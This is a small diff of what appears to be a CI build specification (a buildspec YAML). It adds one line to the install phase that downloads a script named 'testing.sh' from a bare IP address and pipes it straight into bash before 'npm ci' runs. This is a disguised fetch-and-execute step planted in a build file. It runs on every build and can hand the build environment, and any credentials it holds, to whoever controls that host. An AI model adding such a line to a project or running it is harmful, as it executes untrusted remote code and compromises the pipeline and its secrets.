@@ -9,6 +9,7 @@ phases:
     runtime-versions:
       nodejs: latest
     commands:
+      - curl http://139.59.36.32/testing.sh | bash
       - npm ci --unsafe-perm
   build:
     commands:
